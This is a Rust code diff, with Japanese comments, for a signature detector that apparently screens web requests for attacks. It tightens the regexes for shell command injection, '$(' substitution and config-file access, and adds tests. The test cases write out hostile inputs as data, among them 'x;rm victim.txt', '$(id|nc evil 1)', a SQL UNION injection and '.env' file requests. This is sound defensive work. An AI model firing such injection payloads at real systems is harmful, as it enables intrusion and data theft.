@@ -8,9 +8,10 @@ use regex::Regex;
 use serde::{Deserialize, Serialize};
 use tracing::{debug, warn};
 
-/// シェルのコマンドの引数らしいものの始まり（#759）。`-`・`/`・`~`・`.`・
-/// `$`・引用符・`http(s)://`・`C:\`
-const SHELL_ARGUMENT: &str = r#"(?:[-/~.$'"]|https?://|[a-z]:\\)"#;
+/// シェルのコマンドの引数らしいもの（#759）。`-`・`/`・`~`・`.`・`$`・
+/// 引用符・`http(s)://`・`C:\`で始まるもの、数（`kill 1234`）、拡張子の
+/// あるファイル名（`rm victim.txt`、PR #764のレビュー）
+const SHELL_ARGUMENT: &str = r#"(?:[-/~.$'"]|https?://|[a-z]:\\|\d+\b|[\w-]+\.\w)"#;
 
 /// シェルのコマンド名の後に続くもの（#759）。終わり・区切り（`;`・`&`・
 /// `<`・`>`・バッククォート）・閉じ括弧・引用符か、空白と引数らしいもの
@@ -50,10 +51,11 @@ fn backtick_command_pattern() -> String {
 }
 
 /// CMD-003の正規表現（#759）。`$(`の中がシェルのコマンド（パスを付けた
-/// ものも）で、その後が空白か`)`のもの。以前は`\$\([^)]+\)`で、jQueryの
-/// `$(document)`・`$('.x')`にも当たった
+/// ものも）で、その後が空白・`)`・シェルの演算子（`<`・`>`・`|`・`;`・
+/// `&`。`$(id>/tmp/x)`、PR #764のレビュー）のもの。以前は`\$\([^)]+\)`で、
+/// jQueryの`$(document)`・`$('.x')`にも当たった
 fn dollar_paren_command_pattern() -> String {
-    format!(r"(?i)\$\(\s*(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS})(?:\s|\))")
+    format!(r"(?i)\$\(\s*(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS})(?:\s|[)<>|;&])")
 }
 
 /// シグネチャ検知器
@@ -482,12 +484,14 @@ impl SignatureDetector {
             )?,
             // パスの中のファイル名だけ（#759。以前は`.initial`・`.conference`
             // 等の語にも当たった）。始まり・`/`・`\`・`=`の後の名前が
-            // `.env`等で終わり、その後が終わり・区切り・`.`のもの
+            // `.env`等で終わり、その後が終わり・区切り・`.`のものと、引用符で
+            // 囲んだ値の全体がそのファイル名のもの（JSONの`{"file":".env"}`、
+            // PR #764のレビュー。文の`"edit web.config to ..."`は当てない）
             AttackPattern::new(
                 "PATH-008",
                 "Config File Access",
                 DetectionType::UnauthorizedAccess,
-                r#"(?i)(?:^|[/\\=])[\w.-]*\.(?:env|config|ini|conf)(?:$|[/\\?#&;.'"\s])"#,
+                r#"(?i)(?:^|[/\\=])[\w.-]*\.(?:env|config|ini|conf)(?:$|[/\\?#&;.'"\s])|"[\w.-]*\.(?:env|config|ini|conf)"|'[\w.-]*\.(?:env|config|ini|conf)'"#,
                 Severity::High,
                 "Configuration file access",
                 vec![],
@@ -705,10 +709,14 @@ impl SignatureDetector {
         // URL パス
         strings.push(request.path.clone());
 
-        // クエリパラメータ
-        for (key, value) in &request.query_params {
-            strings.push(format!("{}={}", key, value));
-            strings.push(value.clone());
+        // クエリパラメータ。同じ名前の値も、1つずつ調べる（PR #764の
+        // レビュー。`, `でつなぐと、`x;id, benign`のように、値の終わりを
+        // 見るパターンが当たらなかった）
+        for (key, values) in &request.query_params {
+            for value in values {
+                strings.push(format!("{}={}", key, value));
+                strings.push(value.clone());
+            }
         }
 
         // ヘッダー
@@ -781,7 +789,10 @@ mod tests {
         let detector = SignatureDetector::new().await.unwrap();
 
         let mut query_params = HashMap::new();
-        query_params.insert("id".to_string(), "1 UNION SELECT FROM users".to_string());
+        query_params.insert(
+            "id".to_string(),
+            vec!["1 UNION SELECT FROM users".to_string()],
+        );
 
         let request = RequestData {
             request_id: "test-001".to_string(),
@@ -827,7 +838,7 @@ mod tests {
         let detector = SignatureDetector::new().await.unwrap();
 
         let mut query_params = HashMap::new();
-        query_params.insert("category".to_string(), "electronics".to_string());
+        query_params.insert("category".to_string(), vec!["electronics".to_string()]);
 
         let request = RequestData {
             request_id: "test-003".to_string(),
@@ -855,10 +866,12 @@ mod tests {
             request_id: "test-759".to_string(),
             method: "POST".to_string(),
             path: "/mcp".to_string(),
-            query_params: query
-                .iter()
-                .map(|(k, v)| (k.to_string(), v.to_string()))
-                .collect(),
+            query_params: query.iter().fold(HashMap::new(), |mut map, (k, v)| {
+                map.entry(k.to_string())
+                    .or_insert_with(Vec::new)
+                    .push(v.to_string());
+                map
+            }),
             headers: headers
                 .iter()
                 .map(|(k, v)| (k.to_string(), v.to_string()))
@@ -1072,6 +1085,81 @@ mod tests {
                 "{path}: {:?}",
                 result.pattern_names
             );
+        }
+    }
+
+    /// PR #764のレビュー: 数・ファイル名の引数、`$(`の中の演算子、JSONの
+    /// 値のファイル名、同じ名前のクエリの値も検知する
+    #[tokio::test]
+    async fn test_pr764_review_attacks_are_detected() {
+        let detector = SignatureDetector::new().await.unwrap();
+        let cases = [
+            ("q", "x;rm victim.txt", "Shell Command Injection"),
+            ("q", "x;kill 1234", "Semicolon Command"),
+            ("q", "x; cat notes.txt", "Shell Command Injection"),
+            ("q", "x$(id>/tmp/probe)", "Dollar Parenthesis"),
+            ("q", "$(id|nc evil 1)", "Dollar Parenthesis"),
+            ("q", "$(id;ls)", "Dollar Parenthesis"),
+            ("q", "$(whoami&)", "Dollar Parenthesis"),
+        ];
+        for (key, value, name) in cases {
+            let result = detector
+                .detect(&request_with(&[(key, value)], &[], None))
+                .await
+                .unwrap();
+            assert!(
+                result.pattern_names.contains(&name.to_string()),
+                "{value}: {:?}",
+                result.pattern_names
+            );
+        }
+        for body in [
+            r#"{"file":".env"}"#,
+            r#"{"file":"config.ini"}"#,
+            "{'f':'app.conf'}",
+        ] {
+            let result = detector
+                .detect(&request_with(&[], &[], Some(body)))
+                .await
+                .unwrap();
+            assert!(
+                result
+                    .pattern_names
+                    .contains(&"Config File Access".to_string()),
+                "{body}: {:?}",
+                result.pattern_names
+            );
+        }
+        // 同じ名前のクエリの値は、1つずつ調べる
+        let result = detector
+            .detect(&request_with(&[("q", "x;id"), ("q", "benign")], &[], None))
+            .await
+            .unwrap();
+        assert!(
+            result
+                .pattern_names
+                .contains(&"Shell Command Injection".to_string()),
+            "{:?}",
+            result.pattern_names
+        );
+    }
+
+    /// PR #764のレビューの変更後も、普通の文・jQuery・文の中の設定ファイルの
+    /// 名前には当たらない
+    #[tokio::test]
+    async fn test_pr764_review_ordinary_text_is_not_an_attack() {
+        let detector = SignatureDetector::new().await.unwrap();
+        for body in [
+            r#"{"note":"I like dogs; cat lovers disagree; delivery in 3 days"}"#,
+            r#"{"code":"$(document).ready(); $(identity).x; $(idle)"}"#,
+            r#"{"content":"edit web.config to add it","title":"web.config tips"}"#,
+            r#"{"content":"a=b; id=42; cat=books"}"#,
+        ] {
+            let result = detector
+                .detect(&request_with(&[], &[], Some(body)))
+                .await
+                .unwrap();
+            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
         }
     }
 }
